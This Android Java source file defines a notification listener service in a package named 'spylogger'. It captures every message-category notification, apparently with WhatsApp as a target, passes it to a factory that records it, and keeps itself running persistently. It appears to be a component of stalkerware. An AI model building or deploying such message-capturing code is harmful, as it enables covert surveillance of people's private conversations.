package com.gravatasufoca.spylogger.receivers;

import android.app.Notification;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.gravatasufoca.spylogger.helpers.MensagemNotificationFactory;

public class NotificationMonitor extends NotificationListenerService {

    private final String WHATS="com.whatsapp";
    private Context context;


    @Override

    public void onCreate() {

        super.onCreate();
        context = getApplicationContext();

    }
    @Override

    public void onNotificationPosted(StatusBarNotification sbn) {
        if(sbn.getNotification().category.equals(Notification.CATEGORY_MESSAGE)) {
            MensagemNotificationFactory.build(context, sbn);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        Log.i("Msg","Notification Removed");

    }

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

}
